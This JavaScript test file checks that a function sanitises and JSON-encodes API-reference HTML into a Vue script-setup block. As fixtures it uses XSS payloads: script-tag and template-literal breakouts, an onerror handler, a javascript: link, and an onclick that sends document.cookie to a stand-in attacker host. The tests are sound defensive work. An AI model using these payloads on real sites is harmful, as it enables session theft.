import { test } from 'node:test';
import assert from 'node:assert/strict';

import { buildScriptSetup } from './encode-api-html.js';

// 1. Normal HTML produces a valid <script setup> block with const apiHtml.
test('buildScriptSetup: normal HTML embeds as JSON string', () => {
  const out = buildScriptSetup('<p>Hello</p>');
  assert.ok(out.startsWith('<script setup>\n'), 'must open with <script setup>');
  assert.ok(out.includes('const apiHtml ='), 'must declare apiHtml');
  assert.ok(out.endsWith('</script>\n\n'), 'must close with </script>');
  // Value is JSON-encoded: '<p>Hello</p>' → '"\\u003cp>Hello\\u003c/p>"'
  assert.ok(out.includes('"\\u003cp>Hello\\u003c/p>"'), 'must unicode-escape <');
});

// 2. Backtick in input: JSON.stringify produces a double-quoted string literal.
//    A backtick inside "..." is plain text — no template-literal breakout (B3 fixed).
test('buildScriptSetup: backtick in HTML is in a string literal, not a template literal', () => {
  const html = '<p>x</p>`; malicious(); //`';
  const out = buildScriptSetup(html);
  // Output must use a regular string assignment (double-quoted JSON), not a template.
  assert.ok(out.includes('const apiHtml = "'), 'must be a regular string literal');
  assert.ok(!out.includes('const apiHtml = `'), 'must NOT be a template literal');
});

// 3. Backslash followed by backtick: also harmless in a double-quoted string literal.
test('buildScriptSetup: backslash+backtick is inert inside a string literal', () => {
  const html = '<p>x</p>\\`; malicious();';
  const out = buildScriptSetup(html);
  assert.ok(out.includes('const apiHtml = "'), 'must be a regular string literal');
  assert.ok(!out.includes('const apiHtml = `'), 'must NOT be a template literal');
});

// 4. ${...} in input: inside a double-quoted string literal it is not interpolated.
test('buildScriptSetup: ${...} in HTML is inside a string literal, not interpolated', () => {
  const html = '<p>${process.env.SECRET}</p>';
  const out = buildScriptSetup(html);
  assert.ok(out.includes('const apiHtml = "'), 'must be a regular string literal');
  // The ${...} from the HTML is present in the JSON-encoded value, not executed.
  assert.ok(out.includes('"'), 'string must be double-quoted by JSON');
});

// 5. </script> in input: sanitize-html removes it entirely (not an allowed tag);
//    the combined <script>malicious()</script> attack is also stripped.
//    The JSON encoding layer still ensures no raw </script> closes the SFC block.
test('buildScriptSetup: </script> injection is removed by sanitize-html', () => {
  const out = buildScriptSetup('<p>safe</p></script>\n<script>malicious()</script>');
  // sanitize-html removes </script> and <script>…</script> — neither appears.
  assert.ok(!out.includes('</script>') || out.indexOf('</script>') === out.lastIndexOf('</script>'),
    'only the block\'s own </script> may appear');
  assert.ok(!out.includes('malicious('), 'injected script body must not appear');
  // The safe content must survive.
  assert.ok(out.includes('safe'), 'safe HTML content must survive');
});

// 6. </SCRIPT> uppercase: sanitize-html removes it; no raw tag survives.
test('buildScriptSetup: </SCRIPT> uppercase is removed by sanitize-html', () => {
  const out = buildScriptSetup('</SCRIPT>');
  assert.ok(!out.includes('</SCRIPT>'), 'no raw </SCRIPT> in output');
  // The overall output is a valid (empty) script setup block.
  assert.ok(out.startsWith('<script setup>'), 'output must still be a valid script block');
});

// 7. </script > with space: also removed by sanitize-html; no raw or encoded form appears.
test('buildScriptSetup: </script > with trailing space is removed by sanitize-html', () => {
  const out = buildScriptSetup('</script >');
  // sanitize-html strips the stray closing tag; neither raw nor encoded form should appear.
  assert.ok(!out.includes('</script >'), 'no raw </script > in output');
});

// 8. A normal API HTML file produces <div v-html="apiHtml"> when assembled.
test('buildScriptSetup: assembling a full file produces <div v-html="apiHtml">', () => {
  const html = '<p>Packages:</p>\n<ul><li>v1</li></ul>';
  const scriptSetup = buildScriptSetup(html);
  const fileBody = scriptSetup + '<div v-html="apiHtml"></div>';
  assert.ok(fileBody.includes('<div v-html="apiHtml">'), 'must include v-html binding');
  assert.ok(fileBody.includes('const apiHtml ='), 'must include apiHtml declaration');
});

// ---------------------------------------------------------------------------
// Fix 2: sanitize-html removes XSS vectors before JSON encoding
// ---------------------------------------------------------------------------

// 9. Event-handler attributes (on*) must be stripped.
test('buildScriptSetup: onerror handler is removed (no XSS via v-html)', () => {
  const html = '<img src="x" onerror="globalThis.x=1">';
  const out = buildScriptSetup(html);
  assert.ok(!out.includes('onerror'), 'onerror attribute must be stripped');
  assert.ok(!out.includes('globalThis.x'), 'handler body must be stripped');
});

// 10. javascript: URLs must be removed from href.
test('buildScriptSetup: javascript: href is removed', () => {
  const html = '<a href="javascript:alert(1)">click</a>';
  const out = buildScriptSetup(html);
  assert.ok(!out.includes('javascript:'), 'javascript: URL must be stripped');
  // The anchor text may survive if <a> itself survives (href stripped).
});

// 11. onclick and other on* attrs on arbitrary elements must be stripped.
test('buildScriptSetup: onclick on <div> is removed', () => {
  const html = '<div onclick="fetch(\'https://attacker.example/\'+document.cookie)">text</div>';
  const out = buildScriptSetup(html);
  assert.ok(!out.includes('onclick'), 'onclick must be stripped');
  assert.ok(!out.includes('attacker.example'), 'handler body must be stripped');
});

// 12. Realistic API-reference fixture: headings with id, anchor links, tables —
//     all allowlisted content must survive sanitization intact.
test('buildScriptSetup: realistic API fixture preserves ids, anchors, tables', () => {
  const html = `<h2 id="core.gardener.cloud/v1beta1">core.gardener.cloud/v1beta1</h2>
<p>Resource Types:</p>
<ul>
<li><a href="#shoot">Shoot</a></li>
<li><a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.33/#objectmeta-v1-meta">ObjectMeta</a></li>
</ul>
<h3 id="shoot">Shoot</h3>
<p>A Shoot cluster is a Kubernetes cluster.</p>
<table>
<thead><tr><th>Field</th><th>Description</th></tr></thead>
<tbody>
<tr><td><code>metadata</code></td><td><em>Optional</em></td></tr>
</tbody>
</table>`;

  const out = buildScriptSetup(html);

  // ids must survive (required for intra-page #anchor navigation)
  assert.ok(out.includes('id=\\"core.gardener.cloud') || out.includes('id=\\u0022core'),
    'h2 id must survive');
  // fragment hrefs must survive
  assert.ok(out.includes('#shoot'), 'fragment href must survive');
  // external https hrefs must survive
  assert.ok(out.includes('kubernetes.io'), 'https href must survive');
  // table structure must survive
  assert.ok(out.includes('thead') && out.includes('tbody'), 'table structure must survive');
  // code/em tags must survive
  assert.ok(out.includes('code') && out.includes('em'), 'inline tags must survive');
  // no on* handlers crept in
  assert.ok(!out.match(/on[a-z]+=/i), 'no event handlers must be present');
});
